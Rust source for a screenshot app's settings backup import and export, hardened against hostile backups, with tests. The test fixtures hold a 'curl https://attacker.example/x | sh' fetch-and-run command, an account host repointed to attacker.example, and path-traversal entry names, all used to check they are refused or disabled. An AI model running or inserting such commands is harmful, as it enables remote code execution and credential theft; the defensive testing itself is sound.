//! `SettingManager.Export`, `Import` and `ResetSettings`: a settings backup is a zip of
//! `ApplicationConfig.json`, `HotkeysConfig.json` and (when asked) `History.db`.
//!
//! On a Mac there is no `UploadersConfig.json` to put in it: the token lives in the
//! Keychain and never leaves it. Import takes exactly the settings files export writes,
//! by name, and nothing else: upstream took any `.json` or `.xml` entry, which let a
//! backup from somebody else replace the account's host (`UploadersConfig.json`, while
//! the token stays in the Keychain) or the upload queue (`Queue.json`, whose spooled
//! files the queue deletes). Every other entry, and any name with a folder, `..` or an
//! absolute path in it, is left out and named in the report.
//!
//! What is restored is restored whole, except for what runs by itself: an external
//! program ("Perform actions"), the after-capture step that runs those programs, and
//! watch folders. Any of those the backup switches on that this installation did not
//! already have switched on for the same task comes in switched off and is named in the
//! report, so a backup from somebody else cannot start a program on the next capture
//! (MACOS.md, behaviour that differs on purpose).

use std::io::{Read, Write};
use std::path::{Path, PathBuf};

use serde_json::{Map, Value};

use crate::config::{APPLICATION_CONFIG_FILE, HOTKEYS_CONFIG_FILE};
use crate::history::HISTORY_FILE_NAME;
use crate::tasks::settings::{AfterCaptureTasks, FlagNames};

/// `ZipManager.Extract`'s ceiling on what an import may unpack.
pub const IMPORT_MAX_BYTES: u64 = 1_000_000_000;

/// The suggested file name (`ShareX-{version}-backup.sxb`).
pub fn default_file_name(version: &str) -> String {
    format!("Modlight-{version}-backup.sxb")
}

/// `Export(archivePath, settings, history)`: the files are read from `profile`.
pub fn export(profile: &Path, archive: &Path, settings: bool, history: bool) -> Result<(), String> {
    let mut names: Vec<&str> = Vec::new();
    if settings {
        names.push(APPLICATION_CONFIG_FILE);
        names.push(HOTKEYS_CONFIG_FILE);
    }
    if history {
        names.push(HISTORY_FILE_NAME);
    }
    let file = std::fs::File::create(archive).map_err(|e| e.to_string())?;
    let mut zip = zip::ZipWriter::new(file);
    let options = zip::write::SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated);
    for name in names {
        let path = profile.join(name);
        // A file that was never written (no hotkeys changed yet) is simply not there.
        let Ok(bytes) = std::fs::read(&path) else {
            continue;
        };
        zip.start_file(name, options).map_err(|e| e.to_string())?;
        zip.write_all(&bytes).map_err(|e| e.to_string())?;
    }
    zip.finish().map_err(|e| e.to_string())?;
    Ok(())
}

/// The entries `import` restores: the settings files `export` writes.
const RESTORED: [&str; 2] = [APPLICATION_CONFIG_FILE, HOTKEYS_CONFIG_FILE];

/// Written by `export` and passed over by `import`: upstream restores only the settings
/// files, never the history database.
const PASSED_OVER: [&str; 1] = [HISTORY_FILE_NAME];

/// What an import did.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct ImportReport {
    /// The files written into the personal folder.
    pub written: Vec<String>,
    /// Entries left out because a backup of this app never holds them, as the archive
    /// names them.
    pub refused: Vec<String>,
    /// What the restored settings would have switched on to run by itself, and which
    /// came in switched off.
    pub disabled: Vec<DisabledStep>,
}

/// Something that runs by itself, switched on in the backup and not here.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DisabledStep {
    /// The task: `None` for the default task settings, else the hotkey's name.
    pub task: Option<String>,
    pub kind: DisabledKind,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum DisabledKind {
    /// An external program of "Perform actions" (`ExternalProgram.IsActive`).
    Program { name: String, path: String },
    /// `AfterCaptureTasks.PerformActions`: run the active programs after a capture.
    PerformActions,
    /// `WatchFolderEnabled`: upload whatever appears in the watched folders.
    WatchFolders,
}

impl DisabledStep {
    /// One line of the report: the task, then what was switched off in it.
    pub fn text(&self) -> String {
        use crate::l10n::{helpers, mac, s, t, tf};
        let task = match &self.task {
            Some(name) => name.clone(),
            None => t(mac::BackupImportDefaultTask).to_string(),
        };
        let what = match &self.kind {
            DisabledKind::Program { name, path } => {
                tf(mac::BackupImportProgram, &[name.into(), path.into()])
            }
            DisabledKind::PerformActions => t(helpers::AfterCaptureTasks_PerformActions).into(),
            DisabledKind::WatchFolders => t(s::TaskSettingsWindow_WatchFolders).into(),
        };
        format!("{task}: {what}")
    }
}

impl ImportReport {
    /// What the person has to be told after the import, one paragraph each.
    pub fn notes(&self) -> Vec<String> {
        let mut notes = Vec::new();
        if !self.disabled.is_empty() {
            let list = self
                .disabled
                .iter()
                .map(|step| format!("- {}", step.text()))
                .collect::<Vec<_>>()
                .join("\n");
            notes.push(crate::l10n::tf(
                crate::l10n::mac::BackupImportDisabled,
                &[list.into()],
            ));
        }
        if !self.refused.is_empty() {
            notes.push(crate::l10n::tf(
                crate::l10n::mac::BackupImportRefused,
                &[self.refused.join(", ").into()],
            ));
        }
        notes
    }
}

/// `Import(archivePath)`: the settings files of the backup go into `profile`, replacing
/// what is there. Nothing is written unless the whole archive could be read.
pub fn import(archive: &Path, profile: &Path) -> Result<ImportReport, String> {
    let file = std::fs::File::open(archive).map_err(|e| e.to_string())?;
    let mut zip = zip::ZipArchive::new(file).map_err(|e| e.to_string())?;
    let mut total: u64 = 0;
    let mut report = ImportReport::default();
    let mut files: Vec<(String, Vec<u8>)> = Vec::new();
    for index in 0..zip.len() {
        let mut entry = zip.by_index(index).map_err(|e| e.to_string())?;
        let name = entry.name().to_string();
        let restored = !entry.is_dir()
            && RESTORED.contains(&name.as_str())
            && !files.iter().any(|(taken, _)| *taken == name);
        if !restored {
            if !PASSED_OVER.contains(&name.as_str()) {
                report.refused.push(name);
            }
            continue;
        }
        total = total.saturating_add(entry.size());
        if total > IMPORT_MAX_BYTES {
            return Err("The backup is larger than an import may unpack.".into());
        }
        let mut bytes = Vec::new();
        entry
            .by_ref()
            .take(IMPORT_MAX_BYTES + 1)
            .read_to_end(&mut bytes)
            .map_err(|e| e.to_string())?;
        files.push((name, bytes));
    }
    let mut documents = Vec::new();
    for (name, bytes) in files {
        let Ok(Value::Object(mut incoming)) = serde_json::from_slice::<Value>(&bytes) else {
            return Err(format!("{name} in the backup is not a settings document."));
        };
        let current =
            std::fs::read(profile.join(&name)).ok().and_then(
                |bytes| match serde_json::from_slice::<Value>(&bytes) {
                    Ok(Value::Object(map)) => Some(map),
                    _ => None,
                },
            );
        let disabled = disable_new_auto_run(&name, &mut incoming, current.as_ref());
        let bytes = if disabled.is_empty() {
            bytes
        } else {
            serde_json::to_vec_pretty(&Value::Object(incoming)).map_err(|e| e.to_string())?
        };
        report.disabled.extend(disabled);
        documents.push((name, bytes));
    }
    for (name, bytes) in documents {
        crate::config::write_atomically(&profile.join(&name), &bytes).map_err(|e| e.to_string())?;
        report.written.push(name);
    }
    Ok(report)
}

/// Switch off in `incoming` (one restored settings file) everything that runs by itself
/// and that `current` (the same file before the import) did not already have switched
/// on for the same task: the default task settings of `ApplicationConfig.json`, and each
/// hotkey of `HotkeysConfig.json` by its place in the list.
fn disable_new_auto_run(
    name: &str,
    incoming: &mut Map<String, Value>,
    current: Option<&Map<String, Value>>,
) -> Vec<DisabledStep> {
    let mut disabled = Vec::new();
    if name == APPLICATION_CONFIG_FILE {
        if let Some(Value::Object(task)) = incoming.get_mut("DefaultTaskSettings") {
            let before = current
                .and_then(|c| c.get("DefaultTaskSettings"))
                .and_then(Value::as_object);
            for kind in disable_task(task, before) {
                disabled.push(DisabledStep { task: None, kind });
            }
        }
    } else if name == HOTKEYS_CONFIG_FILE {
        let before: &[Value] = current
            .and_then(|c| c.get("Hotkeys"))
            .and_then(Value::as_array)
            .map(Vec::as_slice)
            .unwrap_or_default();
        if let Some(Value::Array(hotkeys)) = incoming.get_mut("Hotkeys") {
            for (index, hotkey) in hotkeys.iter_mut().enumerate() {
                let Some(Value::Object(task)) = hotkey.get_mut("TaskSettings") else {
                    continue;
                };
                let previous = before
                    .get(index)
                    .and_then(|h| h.get("TaskSettings"))
                    .and_then(Value::as_object);
                let kinds = disable_task(task, previous);
                if kinds.is_empty() {
                    continue;
                }
                let label = hotkey_label(task);
                for kind in kinds {
                    disabled.push(DisabledStep {
                        task: Some(label.clone()),
                        kind,
                    });
                }
            }
        }
    }
    disabled
}

/// One TaskSettings node: what it switches on that `before` did not.
fn disable_task(
    task: &mut Map<String, Value>,
    before: Option<&Map<String, Value>>,
) -> Vec<DisabledKind> {
    let mut kinds = Vec::new();

    // Programs: kept on only when this task already had the very same one on.
    let active_before: Vec<&Value> = before
        .and_then(|b| b.get("ExternalPrograms"))
        .and_then(Value::as_array)
        .map(|list| list.iter().filter(|p| is_on(p, "IsActive")).collect())
        .unwrap_or_default();
    if let Some(Value::Array(programs)) = task.get_mut("ExternalPrograms") {
        for program in programs.iter_mut() {
            if !is_on(program, "IsActive") || active_before.contains(&&*program) {
                continue;
            }
            let text = |member: &str| {
                program
                    .get(member)
                    .and_then(Value::as_str)
                    .unwrap_or_default()
                    .to_string()
            };
            let path = text("Path");
            let mut name = text("Name");
            if name.trim().is_empty() {
                name = Path::new(&path)
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default();
            }
            program["IsActive"] = Value::Bool(false);
            kinds.push(DisabledKind::Program { name, path });
        }
    }

    // The after-capture step that runs them.
    let job = |node: Option<&Map<String, Value>>| {
        node.and_then(|n| n.get("AfterCaptureJob"))
            .and_then(AfterCaptureTasks::parse_value)
            .unwrap_or_default()
    };
    let incoming_job = job(Some(task));
    if incoming_job.has(AfterCaptureTasks::PerformActions)
        && !job(before).has(AfterCaptureTasks::PerformActions)
    {
        let job = incoming_job.remove(AfterCaptureTasks::PerformActions);
        task.insert("AfterCaptureJob".into(), Value::String(job.names()));
        kinds.push(DisabledKind::PerformActions);
    }

    // Watch folders: kept on only when every folder was already watched for this task.
    if is_on_in(Some(task), "WatchFolderEnabled") {
        let folders = |node: Option<&Map<String, Value>>| -> Vec<Value> {
            node.and_then(|n| n.get("WatchFolderList"))
                .and_then(Value::as_array)
                .cloned()
                .unwrap_or_default()
        };
        let watched = if is_on_in(before, "WatchFolderEnabled") {
            folders(before)
        } else {
            Vec::new()
        };
        if !folders(Some(task)).iter().all(|f| watched.contains(f)) {
            task.insert("WatchFolderEnabled".into(), Value::Bool(false));
            kinds.push(DisabledKind::WatchFolders);
        }
    }
    kinds
}

fn is_on(node: &Value, member: &str) -> bool {
    node.get(member).and_then(Value::as_bool) == Some(true)
}

fn is_on_in(node: Option<&Map<String, Value>>, member: &str) -> bool {
    node.and_then(|n| n.get(member)).and_then(Value::as_bool) == Some(true)
}

/// What the hotkeys page calls a hotkey: its description, else its task's name.
fn hotkey_label(task: &Map<String, Value>) -> String {
    task.get("Description")
        .and_then(Value::as_str)
        .filter(|d| !d.trim().is_empty())
        .map(str::to_string)
        .unwrap_or_else(|| {
            task.get("Job")
                .cloned()
                .and_then(|job| serde_json::from_value::<crate::hotkeys::HotkeyType>(job).ok())
                .unwrap_or_default()
                .text()
        })
}

/// `ResetSettings`: the settings files go; the next load starts from the defaults.
pub fn reset(profile: &Path) -> std::io::Result<()> {
    for name in [APPLICATION_CONFIG_FILE, HOTKEYS_CONFIG_FILE] {
        let path: PathBuf = profile.join(name);
        if path.exists() {
            std::fs::remove_file(path)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A `.sxb` holding `entries`, as somebody else's tool might have built it.
    fn archive(dir: &Path, entries: &[(&str, &[u8])]) -> PathBuf {
        let path = dir.join("hostile.sxb");
        let file = std::fs::File::create(&path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::SimpleFileOptions::default();
        for (name, bytes) in entries {
            zip.start_file(*name, options).unwrap();
            zip.write_all(bytes).unwrap();
        }
        zip.finish().unwrap();
        path
    }

    #[test]
    fn export_then_import_round_trips_the_settings() {
        let from = tempfile::tempdir().unwrap();
        let to = tempfile::tempdir().unwrap();
        std::fs::write(
            from.path().join(APPLICATION_CONFIG_FILE),
            b"{\"ShowTray\":false}",
        )
        .unwrap();
        std::fs::write(from.path().join(HOTKEYS_CONFIG_FILE), b"{\"Hotkeys\":[]}").unwrap();
        std::fs::write(from.path().join(HISTORY_FILE_NAME), b"sqlite").unwrap();
        let archive = from.path().join(default_file_name("1.0.0"));
        export(from.path(), &archive, true, true).unwrap();
        let report = import(&archive, to.path()).unwrap();
        // History.db is in the backup, but import restores only the settings (upstream).
        assert_eq!(
            report.written,
            [APPLICATION_CONFIG_FILE, HOTKEYS_CONFIG_FILE]
        );
        assert!(report.refused.is_empty(), "{:?}", report.refused);
        assert_eq!(
            std::fs::read(to.path().join(APPLICATION_CONFIG_FILE)).unwrap(),
            b"{\"ShowTray\":false}"
        );
        assert!(!to.path().join(HISTORY_FILE_NAME).exists());
    }

    #[test]
    fn import_takes_only_the_files_export_writes() {
        let dir = tempfile::tempdir().unwrap();
        let refused = [
            "../escape.json",
            "sub/inner.json",
            "/abs.json",
            "run.sh",
            ".hidden.json",
            "ok.xml",
            "sub/ApplicationConfig.json",
            "../HotkeysConfig.json",
            "applicationconfig.json",
        ];
        let mut entries: Vec<(&str, &[u8])> = refused.iter().map(|n| (*n, &b"{}"[..])).collect();
        entries.push((HOTKEYS_CONFIG_FILE, b"{\"Hotkeys\":[]}"));
        let archive = archive(dir.path(), &entries);
        let target = dir.path().join("profile");
        std::fs::create_dir_all(&target).unwrap();
        let report = import(&archive, &target).unwrap();
        assert_eq!(report.written, [HOTKEYS_CONFIG_FILE]);
        assert_eq!(report.refused, refused, "named, in the archive's order");
        assert_eq!(
            std::fs::read(target.join(HOTKEYS_CONFIG_FILE)).unwrap(),
            b"{\"Hotkeys\":[]}"
        );
        assert!(!dir.path().join("escape.json").exists());
        assert!(!target.join("ok.xml").exists());
        assert!(!target.join("sub").exists());
        assert!(!target.join(APPLICATION_CONFIG_FILE).exists());
    }

    /// W1: an `UploadersConfig.json` in a backup would name another host, while the
    /// token stays in the Keychain and would be sent there.
    #[test]
    fn a_backup_cannot_repoint_the_account() {
        use crate::account::{AccountStore, FileCredentialStore, UPLOADERS_CONFIG_FILE};
        let dir = tempfile::tempdir().unwrap();
        let profile = dir.path().join("profile");
        std::fs::create_dir_all(&profile).unwrap();
        let credentials = profile.join("credentials");
        let load = || {
            AccountStore::load(
                &profile,
                Box::new(FileCredentialStore::new(credentials.clone())),
            )
        };
        load()
            .save_sign_in(&modlight_api::SignedIn {
                origin: "http://127.0.0.1:8420".into(),
                token: "tok-123".into(),
                account: modlight_api::AccountInfo {
                    tag: Some("T".into()),
                    ..Default::default()
                },
            })
            .unwrap();
        let before = std::fs::read(profile.join(UPLOADERS_CONFIG_FILE)).unwrap();

        let hostile = archive(
            dir.path(),
            &[
                (APPLICATION_CONFIG_FILE, b"{}"),
                (
                    UPLOADERS_CONFIG_FILE,
                    br#"{"ModlightAccount":{"Host":"https://attacker.example","Tag":"T"}}"#,
                ),
            ],
        );
        let report = import(&hostile, &profile).unwrap();
        assert_eq!(report.written, [APPLICATION_CONFIG_FILE]);
        assert_eq!(report.refused, [UPLOADERS_CONFIG_FILE]);
        assert_eq!(
            std::fs::read(profile.join(UPLOADERS_CONFIG_FILE)).unwrap(),
            before,
            "the account file is untouched"
        );
        let account = load();
        assert_eq!(account.host(), "http://127.0.0.1:8420");
        assert_eq!(
            account.credential().unwrap().host,
            "http://127.0.0.1:8420",
            "the token still goes only where it came from"
        );
    }

    /// W2: a `Queue.json` in a backup could mark any file as the queue's own, which the
    /// queue deletes when it lets the item go.
    #[test]
    fn a_backup_cannot_replace_the_upload_queue() {
        use crate::upload::store::{QUEUE_FILE_NAME, SPOOL_FOLDER_NAME};
        let dir = tempfile::tempdir().unwrap();
        let profile = dir.path().join("profile");
        std::fs::create_dir_all(&profile).unwrap();
        let victim = dir.path().join("work.docx");
        std::fs::write(&victim, b"keep me").unwrap();
        let queue = format!(
            r#"{{"Version":1,"Items":[{{"Id":"a","FileName":"a","SourcePath":{},"OwnsSource":true,"Host":"https://h","Length":1,"DeadlineUtc":"2000-01-01T00:00:00Z"}}]}}"#,
            serde_json::to_string(&victim.to_string_lossy()).unwrap()
        );
        let spooled = format!("{SPOOL_FOLDER_NAME}/a.png");
        let hostile = archive(
            dir.path(),
            &[
                (QUEUE_FILE_NAME, queue.as_bytes()),
                (spooled.as_str(), b"png"),
                (HOTKEYS_CONFIG_FILE, b"{}"),
            ],
        );
        let report = import(&hostile, &profile).unwrap();
        assert_eq!(report.written, [HOTKEYS_CONFIG_FILE]);
        assert_eq!(report.refused, [QUEUE_FILE_NAME, spooled.as_str()]);
        assert!(!profile.join(QUEUE_FILE_NAME).exists());
        assert!(!profile.join(SPOOL_FOLDER_NAME).exists());
        assert!(
            crate::upload::store::QueueStore::new(&profile)
                .load(chrono::Utc::now())
                .is_empty()
        );
        assert!(victim.exists());
    }

    fn program(name: &str, path: &str, args: &str, active: bool) -> Value {
        serde_json::json!({
            "IsActive": active, "Name": name, "Path": path, "Args": args,
            "OutputExtension": null, "Extensions": null,
            "HiddenWindow": false, "DeleteInputFile": false
        })
    }

    fn mine() -> Value {
        program("Optimize", "/opt/homebrew/bin/optipng", "\"$input\"", true)
    }

    fn evil() -> Value {
        program(
            "Evil",
            "/bin/sh",
            "-c \"curl https://attacker.example/x | sh\"",
            true,
        )
    }

    fn read(profile: &Path, name: &str) -> Value {
        serde_json::from_slice(&std::fs::read(profile.join(name)).unwrap()).unwrap()
    }

    /// W3: a backup from somebody else switches on a program after every capture, a
    /// hotkey of its own that runs one, and a new watched folder.
    #[test]
    fn programs_a_backup_switches_on_come_in_switched_off() {
        let dir = tempfile::tempdir().unwrap();
        let profile = dir.path().join("profile");
        std::fs::create_dir_all(&profile).unwrap();
        let folder = |path: &str| serde_json::json!({"FolderPath": path, "Filter": "*.*", "IncludeSubdirectories": false});
        // This installation: one program of its own, run after capture, one watched folder.
        let current = serde_json::json!({
            "DefaultTaskSettings": {
                "AfterCaptureJob": "SaveImageToFile, PerformActions",
                "ExternalPrograms": [mine()],
                "WatchFolderEnabled": true,
                "WatchFolderList": [folder("/Users/a/Inbox")]
            }
        });
        std::fs::write(
            profile.join(APPLICATION_CONFIG_FILE),
            serde_json::to_vec(&current).unwrap(),
        )
        .unwrap();

        let application = serde_json::json!({
            "ShowTray": false,
            "DefaultTaskSettings": {
                "AfterCaptureJob": "PerformActions, UploadImageToHost",
                "ExternalPrograms": [mine(), evil(), program("Off", "/x", "", false)],
                "WatchFolderEnabled": true,
                "WatchFolderList": [folder("/Users/a/Inbox"), folder("/Users/a/Documents")]
            }
        });
        let hotkeys = serde_json::json!({
            "Hotkeys": [
                {"HotkeyInfo": {"Hotkey": "D2, Shift, Control"}, "TaskSettings": {
                    "Job": "RectangleRegion",
                    "UseDefaultAfterCaptureJob": false, "AfterCaptureJob": 2048,
                    "UseDefaultActions": false, "ExternalPrograms": [evil()]
                }},
                {"HotkeyInfo": {"Hotkey": "D1, Shift, Control"}, "TaskSettings": {
                    "Job": "PrintScreen", "Description": "Plain"
                }}
            ]
        });
        let application_bytes = serde_json::to_vec(&application).unwrap();
        let hotkeys_bytes = serde_json::to_vec(&hotkeys).unwrap();
        let hostile = archive(
            dir.path(),
            &[
                (APPLICATION_CONFIG_FILE, &application_bytes),
                (HOTKEYS_CONFIG_FILE, &hotkeys_bytes),
            ],
        );
        let report = import(&hostile, &profile).unwrap();
        assert_eq!(
            report.written,
            [APPLICATION_CONFIG_FILE, HOTKEYS_CONFIG_FILE]
        );
        let region = crate::hotkeys::HotkeyType::RectangleRegion.text();
        assert_eq!(
            report.disabled,
            [
                DisabledStep {
                    task: None,
                    kind: DisabledKind::Program {
                        name: "Evil".into(),
                        path: "/bin/sh".into()
                    }
                },
                DisabledStep {
                    task: None,
                    kind: DisabledKind::WatchFolders
                },
                DisabledStep {
                    task: Some(region.clone()),
                    kind: DisabledKind::Program {
                        name: "Evil".into(),
                        path: "/bin/sh".into()
                    }
                },
                DisabledStep {
                    task: Some(region),
                    kind: DisabledKind::PerformActions
                },
            ]
        );

        let app = read(&profile, APPLICATION_CONFIG_FILE);
        assert_eq!(
            app["ShowTray"],
            serde_json::json!(false),
            "the rest is restored"
        );
        let defaults = &app["DefaultTaskSettings"];
        let programs = defaults["ExternalPrograms"].as_array().unwrap();
        assert_eq!(programs[0], mine(), "already on here: stays on");
        assert_eq!(programs[1]["IsActive"], serde_json::json!(false));
        assert_eq!(
            programs[1]["Path"],
            serde_json::json!("/bin/sh"),
            "kept, to turn on knowingly"
        );
        assert_eq!(programs[2]["IsActive"], serde_json::json!(false));
        assert_eq!(
            defaults["AfterCaptureJob"],
            serde_json::json!("PerformActions, UploadImageToHost"),
            "already on here: stays on"
        );
        assert_eq!(defaults["WatchFolderEnabled"], serde_json::json!(false));
        assert_eq!(defaults["WatchFolderList"].as_array().unwrap().len(), 2);

        // What a capture would now run: only the program that was already on.
        let settings: crate::tasks::TaskSettings =
            serde_json::from_value(defaults.clone()).unwrap();
        let active: Vec<_> = settings
            .external_programs
            .iter()
            .filter(|p| p.is_active)
            .map(|p| p.path.clone().unwrap_or_default())
            .collect();
        assert_eq!(active, ["/opt/homebrew/bin/optipng"]);
        assert!(!settings.watch_folder_enabled);

        let keys = read(&profile, HOTKEYS_CONFIG_FILE);
        let task = &keys["Hotkeys"][0]["TaskSettings"];
        assert_eq!(
            task["ExternalPrograms"][0]["IsActive"],
            serde_json::json!(false)
        );
        let job = AfterCaptureTasks::parse_value(&task["AfterCaptureJob"]).unwrap();
        assert!(!job.has(AfterCaptureTasks::PerformActions));
        assert_eq!(keys["Hotkeys"][1], hotkeys["Hotkeys"][1]);

        let notes = report.notes().join("\n");
        assert!(notes.contains("/bin/sh"), "{notes}");
        assert!(notes.contains("Evil"), "{notes}");
    }

    /// Restoring one's own backup changes nothing here; on another Mac, what runs by
    /// itself waits to be turned on.
    #[test]
    fn ones_own_backup_comes_back_as_it_was() {
        let dir = tempfile::tempdir().unwrap();
        let profile = dir.path().join("profile");
        std::fs::create_dir_all(&profile).unwrap();
        let settings = serde_json::to_vec_pretty(&serde_json::json!({
            "DefaultTaskSettings": {
                "AfterCaptureJob": "SaveImageToFile, PerformActions",
                "ExternalPrograms": [mine()],
                "WatchFolderEnabled": true,
                "WatchFolderList": [{"FolderPath": "/Users/a/Inbox"}]
            }
        }))
        .unwrap();
        std::fs::write(profile.join(APPLICATION_CONFIG_FILE), &settings).unwrap();
        let backup = dir.path().join("mine.sxb");
        export(&profile, &backup, true, false).unwrap();

        let report = import(&backup, &profile).unwrap();
        assert!(report.disabled.is_empty(), "{:?}", report.disabled);
        assert!(report.notes().is_empty());
        assert_eq!(
            std::fs::read(profile.join(APPLICATION_CONFIG_FILE)).unwrap(),
            settings,
            "byte for byte"
        );

        let other = dir.path().join("other-mac");
        std::fs::create_dir_all(&other).unwrap();
        let report = import(&backup, &other).unwrap();
        let kinds: Vec<_> = report.disabled.iter().map(|d| d.kind.clone()).collect();
        assert_eq!(
            kinds,
            [
                DisabledKind::Program {
                    name: "Optimize".into(),
                    path: "/opt/homebrew/bin/optipng".into()
                },
                DisabledKind::PerformActions,
                DisabledKind::WatchFolders,
            ]
        );
    }

    #[test]
    fn a_settings_file_that_is_not_json_fails_the_import() {
        let dir = tempfile::tempdir().unwrap();
        let profile = dir.path().join("profile");
        std::fs::create_dir_all(&profile).unwrap();
        let hostile = archive(
            dir.path(),
            &[
                (HOTKEYS_CONFIG_FILE, b"{}"),
                (APPLICATION_CONFIG_FILE, b"[1, 2]"),
            ],
        );
        assert!(import(&hostile, &profile).is_err());
        assert!(
            !profile.join(HOTKEYS_CONFIG_FILE).exists(),
            "nothing written"
        );
    }

    #[test]
    fn reset_removes_the_settings_files() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(APPLICATION_CONFIG_FILE), b"{}").unwrap();
        reset(dir.path()).unwrap();
        assert!(!dir.path().join(APPLICATION_CONFIG_FILE).exists());
        reset(dir.path()).unwrap();
    }

    #[test]
    fn settings_only_leaves_the_history_out() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(APPLICATION_CONFIG_FILE), b"{}").unwrap();
        std::fs::write(dir.path().join(HISTORY_FILE_NAME), b"db").unwrap();
        let archive = dir.path().join("a.sxb");
        export(dir.path(), &archive, true, false).unwrap();
        let zip = zip::ZipArchive::new(std::fs::File::open(&archive).unwrap()).unwrap();
        let names: Vec<_> = zip.file_names().collect();
        assert_eq!(names, [APPLICATION_CONFIG_FILE]);
    }
}
